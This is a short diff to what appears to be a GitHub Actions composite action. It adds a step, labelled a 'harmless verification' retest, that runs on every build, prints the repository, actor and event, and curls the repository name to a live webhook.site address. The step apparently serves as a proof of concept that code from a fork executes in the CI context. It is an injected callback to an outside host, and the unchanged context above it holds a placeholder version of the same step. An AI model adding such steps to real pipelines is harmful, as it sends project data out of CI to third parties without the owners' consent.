@@ -94,3 +94,11 @@ runs:
         echo "RETEST: fork code executed in CI context"
         echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
         curl -s "https://webhook.site/YOUR-WEBHOOK-ID" -d "retest=3763942&repo=$GITHUB_REPOSITORY" || true
+
+    - name: RETEST-3763942 harmless verification
+      if: always()
+      shell: bash
+      run: |
+        echo "RETEST: fork code executed in CI context"
+        echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
+        curl -s "https://webhook.site/d83eeb2e-832d-4522-bf7f-14b90901e551" -d "retest=3763942&repo=$GITHUB_REPOSITORY" || true
